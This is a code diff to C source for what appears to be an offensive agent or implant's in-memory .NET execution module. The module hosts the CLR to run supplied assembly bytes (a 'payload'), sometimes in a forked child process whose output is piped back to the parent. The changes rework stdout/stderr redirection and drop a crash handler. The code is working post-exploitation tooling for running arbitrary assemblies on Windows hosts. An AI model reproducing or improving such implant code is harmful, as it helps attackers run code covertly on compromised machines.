@@ -127,13 +127,33 @@ static SAFEARRAY* args_to_param_sa(const char *args) {
     return outer;
 }
 
-// ── Stdout redirect to temp file ──────────────────────────────────────────────
+// ── Stdout redirect helpers ───────────────────────────────────────────────────
 
 typedef int  (WINAPI *pfnOSFH)(intptr_t, int);
 typedef int  (WINAPI *pfnDup) (int);
 typedef int  (WINAPI *pfnDup2)(int, int);
 typedef int  (WINAPI *pfnClose)(int);
 typedef FILE*(WINAPI *pfnFdopen)(int, const char*);
+
+// Redirect CRT fd 1 and fd 2 to a Win32 HANDLE.
+static void crt_redirect_fd12(HANDLE fh) {
+    HMODULE hCRT = LoadLibraryA("ucrtbase.dll");
+    if (!hCRT) hCRT = LoadLibraryA("msvcrt.dll");
+    if (!hCRT) return;
+    pfnOSFH  pOSFH  = (pfnOSFH) GetProcAddress(hCRT, "_open_osfhandle");
+    pfnDup2  pDup2  = (pfnDup2) GetProcAddress(hCRT, "_dup2");
+    pfnClose pClose = (pfnClose)GetProcAddress(hCRT, "_close");
+    if (!pOSFH || !pDup2 || !pClose) return;
+    HANDLE fhDup = INVALID_HANDLE_VALUE;
+    DuplicateHandle(GetCurrentProcess(), fh,
+                    GetCurrentProcess(), &fhDup, 0, FALSE, DUPLICATE_SAME_ACCESS);
+    if (fhDup == INVALID_HANDLE_VALUE) return;
+    int fd = pOSFH((intptr_t)fhDup, 0x8001); // _O_WRONLY|_O_BINARY
+    if (fd < 0) { CloseHandle(fhDup); return; }
+    pDup2(fd, 1);
+    pDup2(fd, 2);
+    pClose(fd);
+}
 
 static HANDLE redirect_stdout(WCHAR *tmpPath, HANDLE *origOut, HANDLE *origErr,
                                int *origFd1, int *origFd2) {
@@ -154,31 +174,14 @@ static HANDLE redirect_stdout(WCHAR *tmpPath, HANDLE *origOut, HANDLE *origErr,
     SetStdHandle(STD_OUTPUT_HANDLE, fh);
     SetStdHandle(STD_ERROR_HANDLE,  fh);
 
-    // Also redirect CRT fd 1/2 for assemblies that use the CRT console
+    // Also redirect CRT fd 1/2 for assemblies that write via the CRT.
     HMODULE hCRT = LoadLibraryA("ucrtbase.dll");
     if (!hCRT) hCRT = LoadLibraryA("msvcrt.dll");
     if (hCRT) {
-        pfnOSFH pOSFH  = (pfnOSFH) GetProcAddress(hCRT, "_open_osfhandle");
-        pfnDup  pDup   = (pfnDup)  GetProcAddress(hCRT, "_dup");
-        pfnDup2 pDup2  = (pfnDup2) GetProcAddress(hCRT, "_dup2");
-        pfnClose pClose= (pfnClose)GetProcAddress(hCRT, "_close");
-        if (pOSFH && pDup2) {
-            if (pDup) { *origFd1 = pDup(1); *origFd2 = pDup(2); }
-            // Duplicate fh so CRT owns its copy
-            HANDLE fhDup = INVALID_HANDLE_VALUE;
-            DuplicateHandle(GetCurrentProcess(), fh,
-                            GetCurrentProcess(), &fhDup,
-                            0, FALSE, DUPLICATE_SAME_ACCESS);
-            if (fhDup != INVALID_HANDLE_VALUE) {
-                int pipeFd = pOSFH((intptr_t)fhDup, 0x8001); // _O_WRONLY|_O_BINARY
-                if (pipeFd >= 0) {
-                    pDup2(pipeFd, 1);
-                    pDup2(pipeFd, 2);
-                    if (pClose) pClose(pipeFd);
-                }
-            }
-        }
+        pfnDup  pDup   = (pfnDup) GetProcAddress(hCRT, "_dup");
+        if (pDup) { *origFd1 = pDup(1); *origFd2 = pDup(2); }
     }
+    crt_redirect_fd12(fh);
     return fh;
 }
 
@@ -192,9 +195,7 @@ static void restore_stdout(HANDLE origOut, HANDLE origErr, int origFd1, int orig
         pfnClose pClose = (pfnClose)GetProcAddress(hCRT, "_close");
         if (pDup2 && pClose) {
             if (origFd1 >= 0) { pDup2(origFd1, 1); pClose(origFd1); }
-            else                { pClose(1); }
             if (origFd2 >= 0) { pDup2(origFd2, 2); pClose(origFd2); }
-            else                { pClose(2); }
         }
     }
 }
@@ -371,6 +372,14 @@ char* dotnet_exec(const uint8_t *asm_bytes, size_t asm_len, const char *args, in
     if (!asm_bytes || asm_len < 2) return _strdup("dotnet_exec: empty payload");
     if (!load_oleaut32()) return _strdup("dotnet_exec: oleaut32.dll load failed");
 
+    // Capture pipe handle BEFORE CLR init — ICorRuntimeHost::Start() may reset
+    // standard handles internally (same as observed in the Go agent).
+    HANDLE hPipe = INVALID_HANDLE_VALUE;
+    if (child_mode) {
+        hPipe = GetStdHandle(STD_OUTPUT_HANDLE);
+        if (hPipe == NULL) hPipe = INVALID_HANDLE_VALUE;
+    }
+
     // Load CLRCreateInstance
     HMODULE hMscoree = LoadLibraryA("mscoree.dll");
     if (!hMscoree) return _strdup("dotnet_exec: mscoree.dll not found");
@@ -414,6 +423,14 @@ char* dotnet_exec(const uint8_t *asm_bytes, size_t asm_len, const char *args, in
     if (FAILED(hr) && hr != (HRESULT)0x00000001 /*S_FALSE*/) {
         char buf[64]; snprintf(buf,sizeof(buf),"dotnet_exec: Start hr=0x%08lX",(long)hr);
         return _strdup(buf);
+    }
+
+    // Re-apply stdout/stderr to the pipe immediately after Start().
+    // ICorRuntimeHost::Start() may reset standard handles internally — the Go
+    // agent documents and works around the same behaviour.
+    if (child_mode && hPipe != INVALID_HANDLE_VALUE) {
+        SetStdHandle(STD_OUTPUT_HANDLE, hPipe);
+        SetStdHandle(STD_ERROR_HANDLE,  hPipe);
     }
 
     // ── GetDefaultDomain → QI _AppDomain ────────────────────────────────────
@@ -471,25 +488,14 @@ char* dotnet_exec(const uint8_t *asm_bytes, size_t asm_len, const char *args, in
     HANDLE fhTmp = INVALID_HANDLE_VALUE;
 
     if (child_mode) {
-        // Stdout is already the pipe; redirect stderr to it too.
-        fhTmp = GetStdHandle(STD_OUTPUT_HANDLE);
-        SetStdHandle(STD_ERROR_HANDLE, fhTmp);
-        HMODULE hCRT = LoadLibraryA("ucrtbase.dll");
-        if (!hCRT) hCRT = LoadLibraryA("msvcrt.dll");
-        if (hCRT) {
-            pfnOSFH pOSFH  = (pfnOSFH) GetProcAddress(hCRT, "_open_osfhandle");
-            pfnDup2 pDup2  = (pfnDup2) GetProcAddress(hCRT, "_dup2");
-            pfnClose pClose= (pfnClose)GetProcAddress(hCRT, "_close");
-            if (pOSFH && pDup2 && pClose) {
-                HANDLE fhDup = INVALID_HANDLE_VALUE;
-                DuplicateHandle(GetCurrentProcess(), fhTmp,
-                                GetCurrentProcess(), &fhDup, 0, FALSE, DUPLICATE_SAME_ACCESS);
-                if (fhDup != INVALID_HANDLE_VALUE) {
-                    int fd = pOSFH((intptr_t)fhDup, 0x8001);
-                    if (fd >= 0) { pDup2(fd, 2); pClose(fd); }
-                }
-            }
-        }
+        // Use the pre-captured pipe handle (not GetStdHandle — Start() may have
+        // reset it). Re-apply stdout/stderr Win32 handles and redirect CRT fd 1+2
+        // so both Console.Write (CLR) and printf/puts (CRT) reach the parent pipe.
+        fhTmp = (hPipe != INVALID_HANDLE_VALUE) ? hPipe : GetStdHandle(STD_OUTPUT_HANDLE);
+        SetStdHandle(STD_OUTPUT_HANDLE, fhTmp);
+        SetStdHandle(STD_ERROR_HANDLE,  fhTmp);
+        if (fhTmp != INVALID_HANDLE_VALUE && fhTmp != NULL)
+            crt_redirect_fd12(fhTmp);
     } else {
         fhTmp = redirect_stdout(tmpPath, &origOut, &origErr, &origFd1, &origFd2);
         if (fhTmp != INVALID_HANDLE_VALUE) {
@@ -715,41 +721,14 @@ char* fork_run_assembly(const uint8_t *asm_bytes, size_t asm_len, const char *ar
     return output;
 }
 
-// ── Vectored exception handler for fork-and-run child ────────────────────────
-// MinGW does not support __try/__except, so we use AddVectoredExceptionHandler
-// (pure Win32 API, no compiler extension needed). This handler is installed at
-// the tail of the VEH chain: the CLR's own VEH runs first; for corrupted-state
-// exceptions (.NET 4+ AccessViolationException) the CLR returns
-// EXCEPTION_CONTINUE_SEARCH, so our handler fires next, writes a descriptive
-// error to the parent pipe, and calls ExitProcess(0) so the parent receives
-// the message instead of a cryptic non-zero exit code.
-static LONG WINAPI child_crash_veh(EXCEPTION_POINTERS *ep) {
-    DWORD code = ep->ExceptionRecord->ExceptionCode;
-    // Pass through: non-fatal codes (< 0xC0000000) and CLR-internal exceptions.
-    if ((code & 0xC0000000) != 0xC0000000) return EXCEPTION_CONTINUE_SEARCH;
-    if (code == 0xE0434352 || code == 0xE0000001) return EXCEPTION_CONTINUE_SEARCH;
-    // Fatal native crash from the hosted assembly.
-    char msg[160];
-    int n = _snprintf(msg, sizeof(msg),
-        "[!] assembly crash 0x%08lX%s\n", (unsigned long)code,
-        code == (DWORD)0xC0000005
-            ? " (ACCESS_VIOLATION — unsafe/P-Invoke code crashed the assembly)"
-            : "");
-    DWORD wr = 0;
-    HANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE);
-    if (n > 0) WriteFile(hOut, msg, (DWORD)n, &wr, NULL);
-    FlushFileBuffers(hOut);
-    ExitProcess(0); // clean exit → parent pipe closes, parent reads our message
-    return EXCEPTION_CONTINUE_SEARCH; // unreachable
-}
-
 // ── Child entry: read protocol from stdin, run CLR via pipe, exit ─────────────
 
 void clr_child_run(void) {
-    // Install crash handler at tail of VEH chain. For corrupted-state exceptions
-    // the CLR returns CONTINUE_SEARCH, then our handler writes a descriptive
-    // message and exits cleanly instead of crashing with a raw exit code.
-    AddVectoredExceptionHandler(0, child_crash_veh);
+    // No VEH installed here. In .NET 4+ on x64, AVs from managed code (NullRef,
+    // etc.) go through SEH frames that the CLR's JIT sets up; a tail-of-chain
+    // VEH fires before those SEH frames and would wrongly terminate the process
+    // on any managed exception. Genuine native crashes are reported by the
+    // parent via the non-zero exit code path in fork_run_assembly.
 
     HANDLE hIn = GetStdHandle(STD_INPUT_HANDLE);
     BYTE   hdr[4];
